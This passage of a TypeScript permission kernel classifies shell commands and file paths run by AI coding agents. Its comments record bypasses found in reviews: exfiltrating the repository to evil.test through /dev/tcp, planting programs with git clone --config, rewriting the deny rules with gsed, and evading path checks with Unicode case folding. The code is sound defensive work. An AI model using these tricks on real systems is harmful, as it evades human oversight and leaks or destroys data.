    if (body && !/^-/.test(rest[1]!))
      return ['trap', ...splitShellSegments(body).flatMap(normalizeSegment)];
  }
  if (head === 'eval')
    return [
      'eval ' + rest.slice(1).join(' '),
      ...splitShellSegments(rest.slice(1).join(' ')).flatMap(normalizeSegment),
    ];
  const payloads = findPayloads(rest);
  if (payloads.length) {
    // the carrier itself stays classified (find/fd/parallel are read-only listings); every payload is judged on its own
    return [rest.join(' '), ...payloads.flatMap((p) => splitShellSegments(p).flatMap(normalizeSegment))];
  }

  if (head === 'sudo' || head === 'doas') {
    // skip the privilege tool's own options (and the values of the ones that take one) so the inner command head is
    // found wherever it sits: `sudo -u root -H cp …`, `doas -u root cp …`
    let i = 1;
    while (i < rest.length) {
      const t = rest[i]!;
      if (t === '--') {
        i++;
        break;
      }
      if (!t.startsWith('-')) break;
      i += /^(-u|-g|-p|-C|-h|-U|-r|-t|-D|--user|--group|--prompt|--host|--role|--type|--chdir|--close-from)$/.test(t)
        ? 2
        : 1;
    }
    // THE TAIL IS A COMMAND, so it is normalized like one — from the ORIGINAL TEXT. Handing the tail back as a
    // re-joined token list erases the quoting, and a `-c` body is ONE WORD: `sudo bash -c 'git push origin main'`
    // became `bash -c git push origin main`, whose inline program is the single token `git` (exit review 6). The
    // privilege tool itself keeps its head, as it must, so `command.privileged` still asks.
    const after = rest.slice(i);
    return [rest.join(' '), ...(after.length ? normalizeSegment(requote(after)) : [])];
  }
  return [rest.join(' ')];
}

/** git / gh / glab global options that may precede the subcommand; the option's argument is consumed with it. */
/** Long options that are COMPLETE as written, so abbreviation expansion must leave them alone. `--config` is
 *  clone's own option; expanding it to the unique longer match `--config-env` renamed a real flag (exit review 7). */
const GIT_COMPLETE_LONG = new Set(['--config', '--output', '--file', '--template', '--depth', '--branch', '--origin']);
const GIT_GLOBAL_WITH_ARG = new Set([
  '-C',
  '-c',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--exec-path',
  '--super-prefix',
  '--config-env',
  '--config',
  '--list-cmds',
  '--attr-source',
]);
/** gh / glab flags that take a value (so the next token is not a verb) */
const FORGE_VALUE_FLAGS = new Set([
  // NB: gh's `-i` is --include (a boolean) and must NOT be listed here; listing it made `gh api -i -X DELETE`
  // consume `-X` as its value and hid the method from the mutation matcher (round 14).
  '-R',
  '--repo',
  '--hostname',
  '-H',
  '-t',
  '--title',
  '-b',
  '--body',
  '-F',
  '--body-file',
  '-B',
  '--base',
  '-H',
  '--head',
  '-r',
  '--reviewer',
  '-a',
  '--assignee',
  '-l',
  '--label',
  '-m',
  '--milestone',
  '-p',
  '--project',
  '-T',
  '--template',
  '-q',
  '--jq',
  '--json',
  '-L',
  '--limit',
  '-s',
  '--state',
  '-S',
  '--search',
  '-A',
  '--author',
  '--sort',
  '-f',
  '--field',
  '-X',
  '--method',
  '--input',
  '--cache',
  '-c',
  '--comment',
  '--subject',
  '--body-text',
  '--squash-message',
  '--match-head-commit',
  '--author-email',
  '--source-branch',
  '--target-branch',
  '--description',
  '--fill-verbose',
]);
const GIT_GLOBAL_FLAGS = new Set([
  '-p',
  '--paginate',
  '-P',
  '--no-pager',
  '--no-replace-objects',
  '--bare',
  '--literal-pathspecs',
  '--glob-pathspecs',
  '--noglob-pathspecs',
  '--icase-pathspecs',
  '--no-optional-locks',
  '--no-lazy-fetch',
  '--no-advice',
]);

/**
 * Removes the global option flags of git, gh and glab so `git -C dir push` and `gh -R o/r pr merge` normalize to
 * `git push` and `gh pr merge`. A `-c core.hooksPath=…` (or any hooks-related config override) additionally surfaces
 * as a `git config core.hooksPath …` segment so the hook-bypass matchers see it.
 */
export function stripToolGlobalOptions(head: string, tokens: string[]): { rest: string[]; extra: string[] } {
  const extra: string[] = [];
  const aliases = new Map<string, string>();
  if (head === 'git') {
    let i = 1;
    while (i < tokens.length) {
      const t = tokens[i]!;
      if (GIT_GLOBAL_FLAGS.has(t)) {
        i++;
        continue;
      }
      const eq = t.indexOf('=');
      const name = eq > 0 ? t.slice(0, eq) : t;
      if (GIT_GLOBAL_WITH_ARG.has(name)) {
        const value = eq > 0 ? t.slice(eq + 1) : (tokens[i + 1] ?? '');
        if (
          name === '--git-dir' ||
          name === '--work-tree' ||
          name === '--namespace' ||
          name === '--exec-path'
        )
          extra.push(
            `${MARK}env-inject ${name === '--git-dir' ? 'GIT_DIR' : name === '--work-tree' ? 'GIT_WORK_TREE' : name === '--namespace' ? 'GIT_NAMESPACE' : 'GIT_EXEC_PATH'}`,
          );
        // `git clone --config k=v` IS the same setting by clone's own spelling, and it sits after the verb. It was
        // stripped as an unknown global option before any matcher could see it, so `git clone --config
        // interactive.diffFilter=/tmp/pwn.sh URL` installed a program git runs on every later `add -p` in that
        // repository, at ALLOW (exit review 7).
        if (name === '-c' || name === '--config-env' || name === '--config') {
          // an inline alias redefines a verb: `git -c alias.p=push p …` is `git push …`; an alias whose body is not a
          // literal (config-env) is an execution override the kernel cannot see
          const alias = /^alias\.([^=]+)=(.*)$/.exec(value);
          if (alias) {
            aliases.set(alias[1]!, name === '-c' ? alias[2]! : '');
            extra.push(`git alias-override ${alias[1]}`);
          }
          if (
            // the same SHAPE rule as CONFIG_PROGRAM_VERBS: a key that ends in one of git's program-valued words
            // names a program git will run, and enumerating them left `trailer.<t>.command`, `gpg.program` and
            // every other one off the list reaching ALLOW (exit review 6)
            /^(core\.hooksPath|core\.fsmonitor|core\.editor|core\.pager|core\.sshCommand|core\.gitProxy|core\.askPass|init\.templateDir|sequence\.editor|merge\.[^.]+\.driver|diff\.[^.]+\.(textconv|command)|alias\.|credential\.|http\.|remote\.|url\.|include\.|includeIf\.|diff\.external|filter\.|receive\.|uploadpack\.|protocol\.|pager\.|difftool\.|mergetool\.|guitool\.|trailer\.|gpg\.|ssh\.|fsmonitor\.)|\.(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|sshcommand|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter)=/i.test(
              value,
            )
          )
            extra.push(`git config ${value.replace('=', ' ')}`);
        }
        i += eq > 0 ? 1 : 2;
        continue;
      }
      break;
    }
    let restGit = tokens.slice(i);
    // CLONE'S OWN `--config` SITS AFTER THE VERB, where the global-option scan above never looks — it stops at the
    // first non-option token, which is the verb itself. So `git clone --config interactive.diffFilter=/tmp/pwn.sh
    // URL` installed a program git runs on every later `add -p` in the new repository, at ALLOW (exit review 7).
    if (restGit[0] === 'clone')
      for (let k = 1; k < restGit.length; k++) {
        const t = restGit[k]!;
        const m = /^(--config|--config-env|-c)(?:=(.*))?$/.exec(t);
        if (!m) continue;
        const value = m[2] ?? restGit[k + 1] ?? '';
        if (
          /^(core\.hooksPath|core\.fsmonitor|core\.editor|core\.pager|core\.sshCommand|core\.gitProxy|core\.askPass|init\.templateDir|sequence\.editor|merge\.[^.]+\.driver|diff\.[^.]+\.(textconv|command)|alias\.|credential\.|http\.|remote\.|url\.|include\.|includeIf\.|diff\.external|filter\.|receive\.|uploadpack\.|protocol\.|pager\.|difftool\.|mergetool\.|guitool\.|trailer\.|gpg\.|ssh\.|fsmonitor\.)|\.(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|sshcommand|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter)=/i.test(
            value,
          )
        )
          extra.push(`git config ${value.replace('=', ' ')}`);
      }
    const verb = restGit[0];
    if (verb && aliases.has(verb)) {
      const body = aliases.get(verb)!;
      // a literal alias body replaces the verb; a shell alias (`!cmd`) or an unknown body is opaque and surfaced as such
      if (body && !body.startsWith('!')) restGit = [...tokenize(body), ...restGit.slice(1)];
      else extra.push(body.startsWith('!') ? `git alias-shell ${body.slice(1)}` : `git alias-opaque ${verb}`);
    }
    return { rest: ['git', ...restGit], extra };
  }
  if (head === 'gh' || head === 'glab') {
    // cobra accepts flags anywhere: the verb path is the sequence of non-flag tokens (a value-taking flag consumes
    // its value), so `gh --title t pr create` and `gh pr -R o/r merge 3` both normalize to `gh pr create` / `gh pr merge 3`
    const verbs: string[] = [];
    const rest: string[] = [];
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i]!;
      if (t.startsWith('-')) {
        const eq = t.indexOf('=');
        const name = eq > 0 ? t.slice(0, eq) : t;
        if (eq < 0 && FORGE_VALUE_FLAGS.has(name) && i + 1 < tokens.length) {
          rest.push(t, tokens[i + 1]!);
          i++;
        } else rest.push(t);
        continue;
      }
      if (verbs.length < 2) verbs.push(t);
      else rest.push(t);
    }
    return { rest: [head, ...verbs, ...rest], extra };
  }
  if (/^(docker|podman|nerdctl)$/.test(head)) {
    // Docker's GLOBAL options sit between the program and the subcommand, and every docker matcher is anchored on
    // `docker <verb>`: a single `--log-level debug` or `--tls` displaced the verb, so `docker exec` — entering a
    // running container — reached ALLOW (exit review 4). The segment is left INTACT, because the engine is read
    // from that same leading run of options; a canonical spelling is added ALONGSIDE it so the verb is classified
    // as well as the engine, and the strongest of the two verdicts decides.
    let i = 1;
    while (i < tokens.length && tokens[i]!.startsWith('-')) {
      if (DOCKER_GLOBAL_VALUE_OPTS.test(tokens[i]!)) i++;
      i++;
    }
    if (i > 1 && i < tokens.length) extra.push([head, ...tokens.slice(i)].join(' '));
  }
  return { rest: tokens, extra };
}

/** Output redirection targets of a segment (`> f`, `>> f`, `2> f`, `&> f`), quotes removed; heredocs and fd dups excluded. */
export function redirectionTargets(segment: string): string[] {
  const out: string[] = [];
  // a redirection operator glued to the preceding word (`echo x>file`, `printf y>>file`) is still a redirect to the
  // shell: separate it so the anchored scan below sees it. Do not touch fd digits (`2>`), `&>`, `>>`, or `->`/`=>`.
  // a backslash-newline continuation is erased by the shell before it opens the file, so erase it first too
  const joined = segment.replace(/\\\r?\n/g, '');
  const unglued = joined.replace(/([^\s&|<>])(<>|>{1,2})/g, '$1 $2');
  // a target is a run of quoted and unquoted chunks: `"control-plane"/permissions/x`, `control-plan\e/x`, 'a b'/c
  // `>&WORD` IS A FILE REDIRECT WHENEVER WORD IS NOT A FILE DESCRIPTOR. bash treats `>&log` exactly like `&>log`
  // and sends BOTH streams to that file, so `echo x >& .git/hooks/pre-commit` writes the hook — and it was not
  // read as a write at all, because the `&` was not part of the operator (exit review 4). The operator is now
  // captured so that a numeric target — `2>&1`, `>&-` — can be told apart as the fd duplication it is.
  const re = /(?:^|\s)(\d?<>|\d?>>?&?\|?|&>>?\|?)\s*((?:"[^"]*"|'[^']*'|\\.|[^\s;&|])+)/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(unglued))) {
    const target = unquoteShellWord(m[2]!);
    if (m[1]!.endsWith('&') && /^\d+$|^-$/.test(target)) continue; // fd duplication, not a file
    if (target.startsWith('&')) continue;
    // real device sinks are not writes to a governed path — but only after `..` is resolved away, so that
    // `/dev/../etc/x` is judged as `/etc/x` (round 13)
    if (isDevPath(target)) continue;
    out.push(target);
  }
  return out;
}

/** `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` ARE NOT FILES. bash intercepts the pathname inside its own
 *  redirection code and calls connect(2); nothing is opened on disk, and `ls /dev/tcp` is ENOENT. */
const NET_DEVICE_RE = /^\/dev\/(tcp|udp)\/([^/]+)\/([^/]+)$/;
/** True when a path names a real device, which is a DISCARD rather than a destination — `/dev/null`, `/dev/tty`.
 *
 *  Two things this gets right that three separate `/^\/dev\//` tests did not. It RESOLVES first, so `/dev/..` is
 *  `/` and `/dev/../Users/me/.zshrc` is judged as the home file it is — a nine-character prefix had been turning
 *  an absolute deny into ALLOW for any path on the machine. And it excludes the network pseudo-paths, which are
 *  sockets: `tar czf - . > /dev/tcp/evil.test/443` streamed the whole repository, `.git` and `.env` included, to
 *  an arbitrary host at ALLOW, with no network binary anywhere on the line (exit review 7). */
const BLOCK_DEVICE_RE = /^\/dev\/r?(disk|sd|hd|nvme|vd|xvd|mmcblk|loop)\w*$/;
function isDeviceDiscard(path: string): boolean {
  const a = path.startsWith('/') ? resolve(path) : path;
  if (a !== '/dev' && !a.startsWith('/dev/')) return false;
  // `/dev/null` and `/dev/tty` swallow what they are given; `/dev/disk0` is the DISK, and `cp /dev/zero
  // /dev/disk0` overwrites it (exit review 7). A raw block device is a destination, not a discard.
  return !NET_DEVICE_RE.test(a) && !BLOCK_DEVICE_RE.test(a);
}
/** Verbs whose effect on the path they name is irreversible, so an unreadable operand is a gap rather than noise. */
const DESTRUCTIVE_HEADS = new Set(['rm', 'unlink', 'rmdir', 'shred', 'mv', 'truncate', 'chmod', 'chown', 'dd']);
/** True when a path is under `/dev` AFTER resolution — device or network pseudo-path alike. A network redirection
 *  is not a file, so it must not be judged in the PATH channel (as a write outside the workspace, which would
 *  deny the ordinary `echo > /dev/tcp/localhost/8080` connectivity check); the `net-redirect` marker carries it
 *  to the network capability instead, where `nc localhost 8080` already sits. */
function isDevPath(path: string): boolean {
  const a = path.startsWith('/') ? resolve(path) : path;
  return a === '/dev' || a.startsWith('/dev/');
}

/** Removes shell quoting and backslash escapes from a single word, the way the shell does before it opens a file. */
function unquoteShellWord(w: string): string {
  let out = '';
  let quote: string | null = null;
  for (let i = 0; i < w.length; i++) {
    const ch = w[i]!;
    if (quote) {
      if (ch === quote) {
        quote = null;
        continue;
      }
      if (ch === '\\' && quote === '"' && i + 1 < w.length) {
        out += w[++i]!;
        continue;
      }
      out += ch;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      continue;
    }
    if (ch === '\\' && i + 1 < w.length) {
      out += w[++i]!;
      continue;
    }
    out += ch;
  }
  return out;
}

/** Like tokenize, but records whether each token contained a quote (quoted words are data, not command heads). */
function tokenizeMarked(s: string): Array<{ text: string; quoted: boolean }> {
  const out: Array<{ text: string; quoted: boolean }> = [];
  let cur = '';
  let quote: string | null = null;
  let wasQuoted = false;
  const flush = () => {
    if (cur || wasQuoted) out.push({ text: cur, quoted: wasQuoted });
    cur = '';
    wasQuoted = false;
  };
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]!;
    if (ch === '\\' && quote !== "'" && i + 1 < s.length) {
      cur += s[++i]!;
      continue;
    }
    if (quote) {
      if (ch === quote) quote = null;
      else cur += ch;
      continue;
    }
    const ansi = ch === '$' ? ansiCAt(s, i) : null;
    if (ansi) {
      // ANSI-C `$'...'` yields an ordinary word (a possible command head), so it is NOT marked quoted
      cur += ansi.text;
      i = ansi.end;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      wasQuoted = true;
      continue;
    }
    if (/\s/.test(ch)) {
      flush();
      continue;
    }
    cur += ch;
  }
  flush();
  return out;
}

// Decode a bash ANSI-C `$'...'` body: the shell expands its escapes and yields an ordinary (unquoted) word, so a
// locked verb hidden as `$'push'` / `$'\\x70ush'` must be seen literally by the classifier.
function decodeAnsiC(b: string): string {
  let out = '';
  for (let i = 0; i < b.length; i++) {
    if (b[i] !== '\\') {
      out += b[i];
      continue;
    }
    const c = b[++i];
    if (c === undefined) {
      out += '\\';
      break;
    }
    if (c === 'n') out += '\n';
    else if (c === 't') out += '\t';
    else if (c === 'r') out += '\r';
    else if (c === 'a') out += '\x07';
    else if (c === 'b') out += '\b';
    else if (c === 'f') out += '\f';
    else if (c === 'v') out += '\v';
    else if (c === 'e' || c === 'E') out += '\x1b';
    else if (c === '\\' || c === "'" || c === '"') out += c;
    else if (c === 'x') {
      const m = /^[0-9a-fA-F]{1,2}/.exec(b.slice(i + 1));
      if (m) {
        out += String.fromCharCode(parseInt(m[0], 16));
        i += m[0].length;
      } else out += 'x';
    } else if (c === 'u') {
      const m = /^[0-9a-fA-F]{1,4}/.exec(b.slice(i + 1));
      if (m) {
        out += String.fromCharCode(parseInt(m[0], 16));
        i += m[0].length;
      } else out += 'u';
    } else if (c >= '0' && c <= '7') {
      const m = /^[0-7]{1,3}/.exec(b.slice(i));
      if (m) {
        out += String.fromCharCode(parseInt(m[0], 8) & 0xff);
        i += m[0].length - 1;
      }
    } else out += c;
  }
  return out;
}
/** Consume a `$'...'` ANSI-C literal starting at s[i] (which is `$`); returns the decoded word and the index of the
 *  closing quote, or null if s[i] does not start an ANSI-C quote. */
function ansiCAt(s: string, i: number): { text: string; end: number } | null {
  if (s[i] !== '$' || s[i + 1] !== "'") return null;
  let j = i + 2;
  let body = '';
  while (j < s.length && s[j] !== "'") {
    if (s[j] === '\\' && j + 1 < s.length) {
      body += s[j]! + s[j + 1]!;
      j += 2;
    } else {
      body += s[j]!;
      j++;
    }
  }
  return { text: decodeAnsiC(body), end: j };
}

function tokenize(s: string): string[] {
  const out: string[] = [];
  let cur = '';
  let quote: string | null = null;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]!;
    // a backslash escape is removed the way the shell removes it (`.ss\h` is `.ssh`), except inside single quotes
    if (ch === '\\' && quote !== "'" && i + 1 < s.length) {
      cur += s[++i]!;
      continue;
    }
    if (quote) {
      if (ch === quote) quote = null;
      else cur += ch;
      continue;
    }
    const ansi = ch === '$' ? ansiCAt(s, i) : null;
    if (ansi) {
      cur += ansi.text;
      i = ansi.end;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      continue;
    }
    if (/\s/.test(ch)) {
      if (cur) out.push(cur);
      cur = '';
      continue;
    }
    cur += ch;
  }
  if (cur) out.push(cur);
  return out;
}

/** THE NAME THE FILESYSTEM WILL RESOLVE, not the bytes that were typed.
 *
 *  macOS and Windows compare filenames with full Unicode case folding, which maps more than upper to lower:
 *  `ſ` (U+017F LATIN SMALL LETTER LONG S) folds to `s`, so `.harnesſ/runtime/pin.json` IS `.harness/runtime/`
 *  on the disk this kernel runs on — verified on this machine. Comparing the typed bytes let a write to EGO's
 *  own runtime, to `.claude/ſettings.json`, to `.huſky/pre-commit` and to `policieſ/organization/` reach ALLOW,
 *  and the plain case variant `.harness/hooKs/` did the same (exit review 8).
 *
 *  `toUpperCase().toLowerCase()` performs that fold in JavaScript: `'ſ'.toUpperCase()` is `'S'`. NFC first, so a
 *  decomposed name compares equal to its composed twin. On a case-SENSITIVE filesystem this over-matches a name
 *  that really is distinct; that direction only ever adds protection, and it is the direction to be wrong in. */
function foldName(p: string): string {
  return p.normalize('NFC').toUpperCase().toLowerCase();
}

export function matchPathPattern(pattern: string, absPath: string, ctx: EvaluationContext): boolean {
  const tryMatch = (posix: string, homeBase: string, roots: string[]): boolean => {
    let pat = pattern;
    let base: string | null = null;
    if (pat.startsWith('~/')) {
      pat = pat.slice(2);
      base = homeBase;
    }
    const re = globToRegExp(pat);
    if (base) return re.test(posix.startsWith(base + '/') ? posix.slice(base.length + 1) : '\0');
    // repo-relative patterns: test against every registered root, then against the cwd root
    for (const root of roots) {
      if (posix.startsWith(root + '/') && re.test(posix.slice(root.length + 1))) return true;
    }
    if (pat.startsWith('**/')) return re.test(posix);
    return false;
  };
  // Match against BOTH the realpath-resolved path (catches a symlink that points INTO a protected tree) AND the lexical
  // path (catches a protected NAME node that is itself a symlink, e.g. a `.git` symlink whose realpath drops the name).
  const canonRoots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
    canonicalPath(r).split(sep).join('/'),
  );
  const lexRoots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
    resolve(r).split(sep).join('/'),
  );
  const canonPosix = canonicalPath(absPath).split(sep).join('/');
  const lexPosix = (isAbsolute(absPath) ? absPath : resolve(absPath)).split(sep).join('/');
  // ...and once more on the FOLDED name, which is what the filesystem will actually resolve
  const foldRoots = canonRoots.map(foldName);
  return (
    tryMatch(canonPosix, canonicalPath(homedir()).split(sep).join('/'), canonRoots) ||
    (lexPosix !== canonPosix && tryMatch(lexPosix, homedir().split(sep).join('/'), lexRoots)) ||
    (foldName(canonPosix) !== canonPosix &&
      tryMatch(foldName(canonPosix), foldName(canonicalPath(homedir()).split(sep).join('/')), foldRoots))
  );
}

export function globToRegExp(glob: string): RegExp {
  let re = '^';
  for (let i = 0; i < glob.length; i++) {
    const ch = glob[i]!;
    if (ch === '*') {
      if (glob[i + 1] === '*') {
        re += glob[i + 2] === '/' ? '(?:.*/)?' : '.*';
        i += glob[i + 2] === '/' ? 2 : 1;
      } else re += '[^/]*';
    } else if (ch === '?') re += '[^/]';
    else if ('\\^$.|+()[]{}'.includes(ch)) re += `\\${ch}`;
    else re += ch;
  }
  return new RegExp(re + '$', 'i');
}

function verdictFor(table: CompiledAuthorityTable, ctx: EvaluationContext, capability: string): Verdict {
  const p = table.profiles[ctx.profile] ?? table.profiles[Object.keys(table.profiles)[0]!];
  const m = p?.modes[ctx.mode] ?? p?.modes[table.defaultMode];
  return m?.[capability] ?? table.effective[capability] ?? 'ASK';
}

function isAbsoluteCap(table: CompiledAuthorityTable, id: string): boolean {
  return table.capabilities[id]?.absolute === true;
}

/** Canonical absolute path: symlinks resolved on the deepest existing ancestor so a not-yet-created file compares correctly. */
export function canonicalPath(p: string): string {
  const abs = resolve(p);
  try {
    return realpathSync(abs);
  } catch {
    const parent = dirname(abs);
    if (parent === abs) return abs;
    return join(canonicalPath(parent), abs.slice(parent.length + 1));
  }
}

function insideRoots(absPath: string, ctx: EvaluationContext): boolean {
  const posix = canonicalPath(absPath).split(sep).join('/');
  const roots = [...ctx.repoRoots, ...(ctx.egoHome ? [ctx.egoHome] : [])].map((r) =>
    canonicalPath(r).split(sep).join('/'),
  );
  return roots.some((r) => posix === r || posix.startsWith(r + '/'));
}

const TRUST_STORE_DIRS = ['trust', 'index', 'releases', 'runtimes'];
/** The trust store must be recognised however the path is cased: macOS and Windows resolve `~/.ego/RUNTIMES/…` to the
 *  real `runtimes` directory. Matching case-insensitively everywhere fails closed on a case-sensitive filesystem too. */
const foldCase = (p: string): string => p.toLowerCase();
/** true when a posix path IS one of the EGO_HOME trust-store directories or lies within it (the dir node itself counts). */
function underTrustDir(posix: string, home: string): boolean {
  const p = foldCase(posix);
  const h = foldCase(home);
  return TRUST_STORE_DIRS.some((d) => p === `${h}/${d}` || p.startsWith(`${h}/${d}/`));
}
/** Whether a path (or a glob's literal prefix) reaches the EGO_HOME trust store: at/under a trust dir; a glob that
 *  completes to one; or the EGO_HOME root itself under a glob or a recursive whole-tree op (parent copy/delete). */
function reachesTrustStore(prefixPosix: string, home: string, isGlob: boolean, recursive: boolean): boolean {
  const prefix = foldCase(prefixPosix);
  const h = foldCase(home);
  if (prefix === h) return isGlob || recursive;
  return TRUST_STORE_DIRS.some((d) => {
    const dir = `${h}/${d}`;
    if (prefix === dir || prefix.startsWith(dir + '/')) return true;
    if (isGlob && (dir.startsWith(prefix + '/') || dir.startsWith(prefix))) return true;
    return false;
  });
}
/** tools whose locked operations are searched for in argument position (see classifyCommand) */
const LOCKED_HEADS = new Set([
  'git',
  'gh',
  'glab',
  'az',
  'kubectl',
  'oc',
  'helm',
  'terraform',
  'pulumi',
  'aws',
  'gcloud',
  'argocd',
  'flux',
  'vault',
  'rm',
  'harness',
  'ego',
  'claude',
  'codex',
  'npx',
  'bunx',
  'pnpx',
]);

/** The OS temporary directory is scratch space: neither workspace nor protected. */
export function isScratchPath(abs: string): boolean {
  const posix = canonicalPath(abs).split(sep).join('/');
  const roots = new Set([
    canonicalPath(tmpdir()).split(sep).join('/'),
    '/tmp',
    '/private/tmp',
    '/var/tmp',
    '/private/var/tmp',
  ]);
  for (const r of roots) if (posix === r || posix.startsWith(r + '/')) return true;
  return false;
}
const WRITE_HEADS = new Set([
  'cp',
  'mv',
  // the GNU-named twins macOS installs: `gsed -i` edits in place exactly as `sed -i` does, and the destination
  // rules never saw it, so `gsed -i 's/DENY/ALLOW/' control-plane/permissions/absolute-denies.md` rewrote the
  // absolute denies themselves at ALLOW (exit review 7)
  'gsed',
  'gawk',
  'gcp',
  'gmv',
  'sort',
  'uniq',
  'yq',
  'tee',
  'ln',
  'install',
  'dd',
  'rsync',
  'sed',
  'perl',
  'truncate',
  'rm',
  'chmod',
  'chown',
  'touch',
  'mkdir',
  'rmdir',
  'python',
  'python3',
  'node',
  'tar',
  'bsdtar',
  'gtar',
  'unzip',
  'zip',
  'cpio',
  'pax',
  'gcp',
  'gmv',
  'ditto',
  'rename',
  'shred',
  'unlink',
  'patch',
  'git',
  'find', // `-fprint`/`-fls`/`-fprintf FILE` write FILE
  'scp',
]);

/** Value of an option in every spelling that a real CLI accepts: `--long VALUE`, `--long=VALUE`, `-o VALUE` and the
 *  glued short form `-oVALUE`, including when the letter sits inside a cluster (`-xC DIR`, `-xCDIR`, `-qod DIR`). */
function optionValue(tokens: string[], short: string, longs: string[]): string | null {
  // the tool applies the LAST occurrence, so the last one is the destination that actually gets written
  const all = optionValues(tokens, short, longs);
  return all.length ? all[all.length - 1]! : legacyOptionValue(tokens, short, longs);
}

function legacyOptionValue(tokens: string[], short: string, longs: string[]): string | null {
  for (let i = 1; i < tokens.length; i++) {
    const t = tokens[i]!;
    for (const l of longs) {
      if (t === l) return tokens[i + 1] ?? null;
      if (t.startsWith(l + '=')) return t.slice(l.length + 1);
    }
    if (!short || !t.startsWith('-') || t.startsWith('--')) continue;
    const at = t.indexOf(short, 1);
    if (at < 0) continue;
    // the characters between the dash and the option letter must themselves be option letters: without this, the
    // `h` inside `-url=jdbc:postgresql://localhost:5432/app` reads as `-h` and invents a host (round 14)
    if (!/^-[A-Za-z0-9]*$/.test(t.slice(0, at))) continue;
    const glued = t.slice(at + 1);
    if (glued) return glued;
    return tokens[i + 1] ?? null;
  }
  return null;
}

/** Options of copy-like tools that consume the NEXT token as their value; their value is never the destination. */
/** Value-taking options PER TOOL. A boolean flag listed here would swallow the real destination, which is exactly
 *  what `cp SRC -i DEST` did while `-i` (interactive) sat in a shared list (round 15). */
const VALUE_OPTS_BY_HEAD: Record<string, RegExp> = {
  cp: /^(--sparse|--reflink|-S|--suffix|--backup|-t|--target-directory|-Z|--context)$/,
  install: /^(-m|--mode|-o|--owner|-g|--group|-S|--suffix|-t|--target-directory|-Z|--context|--backup)$/,
  mv: /^(-S|--suffix|-t|--target-directory|--backup)$/,
  rsync:
    /^(-e|--rsh|--exclude|--include|--exclude-from|--include-from|--files-from|--log-file|--temp-dir|--partial-dir|--compare-dest|--link-dest|--copy-dest|--bwlimit|--timeout|--contimeout|--port|--chmod|--chown|--backup-dir|--suffix|--max-size|--min-size|--out-format|--rsync-path|--filter|-f|--block-size|--modify-window|--iconv)$/,
  scp: /^(-P|-i|-c|-F|-l|-J|-o|-S|-D)$/,
  cpio: /^(-H|--format|-F|--file|-R|--owner|-D|--directory)$/,
  ditto: /^(--arch|--bom|--extattr)$/,
};
const copyValueOpts = (head: string): RegExp | undefined => VALUE_OPTS_BY_HEAD[head];

export function classifyPath(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  tool: 'Read' | 'Write' | 'Edit',
  rawPath: string,
): CapabilityHit {
  const homed = expandHome(rawPath) ?? rawPath;
  const abs = isAbsolute(homed) ? homed : resolve(ctx.cwd ?? process.cwd(), homed);
  if (tool !== 'Read' && ctx.egoHome && 'ego.trust.tamper' in table.capabilities) {
    const home = canonicalPath(ctx.egoHome).split(sep).join('/');
    const posix = canonicalPath(abs).split(sep).join('/');
    // EGO_HOME is EGO's OWN runtime state, not just its trust directories: the index that records which runtime
    // is trusted, the cache it is loaded from, the pins. Protecting only `trust/` left `index.json` writable, and
    // that file decides which runtime EGO believes in (exit review). A path matcher cannot cover this, because
    // EGO_HOME is wherever the operator put it.
    if (posix === home || posix.startsWith(home + '/')) {
      return {
        capability: 'ego.trust.tamper',
        verdict: verdictFor(table, ctx, 'ego.trust.tamper'),
        via: underTrustDir(posix, home) ? 'EGO_HOME trust store' : 'EGO_HOME runtime state',
        absolute: true,
      };
    }
  }
  for (const m of table.matchers) {
    if (!m.path) continue;
    if (m.tool !== tool && !(m.tool === 'Write' && tool === 'Edit')) continue;
    if (matchPathPattern(m.path, abs, ctx)) {
      return {
        capability: m.capability,
        verdict: verdictFor(table, ctx, m.capability),
        via: `matcher path ${m.path}`,
        absolute: isAbsoluteCap(table, m.capability),
      };
    }
  }
  const inside = insideRoots(abs, ctx);
  // the OS temporary directory is scratch space unless the workspace itself lives there
  if (!inside && isScratchPath(abs)) {
    const cap = tool === 'Read' ? 'fs.scratch.read' : 'fs.scratch.write';
    return {
      capability: cap,
      verdict: verdictFor(table, ctx, cap),
      via: 'OS temporary directory',
      absolute: false,
    };
  }
  const cap =
    tool === 'Read'
      ? inside
        ? 'fs.repo.read'
        : 'fs.outside-workspace.read'
      : inside
        ? 'fs.repo.write'
        : 'fs.outside-workspace.write';
  return {
    capability: cap,
    verdict: verdictFor(table, ctx, cap),
    via: inside ? 'inside registered repository' : 'outside registered repositories',
    absolute: false,
  };
}

const MAX_EFFECT_DEPTH = 4;
const MAX_SCRIPT_BYTES = 64 * 1024;
/** classes that only say "the kernel cannot see inside"; they never escalate a command whose class the matchers declared */
const OPACITY_CLASSES = new Set(['command.unknown', 'command.interpreter-script', 'command.script-opaque']);
/** keywords that prefix a command on the same line: strip and classify the remainder (`if git push`, `do npm test`) */
// `while` and `until` are followed by a COMMAND — the loop's condition, which runs at least once — and both were
// missing, so `while psql -h prod-db… -c 'DROP TABLE users'; do break; done` kept the keyword in the segment and
// no target-aware rule could match it (exit review 8). `for` and `case` are deliberately absent: what follows
// them is a variable name and a word to match, not a command.
const PREFIX_KEYWORDS = new Set(['if', 'then', 'else', 'elif', 'do', 'while', 'until', '!', '{', '}', 'time']);
/** statements that are shell structure, never an external effect: the whole segment is skipped */
const PACKAGE_MANAGER_BUILTINS = new Set([
  'install',
  'i',
  'ci',
  'add',
  'remove',
  'rm',
  'uninstall',
  'update',
  'up',
  'upgrade',
  'link',
  'unlink',
  'publish',
  'pack',
  'init',
  'create',
  'exec',
  'dlx',
  'x',
  'npx',
  'cache',
  'config',
  'set',
  'get',
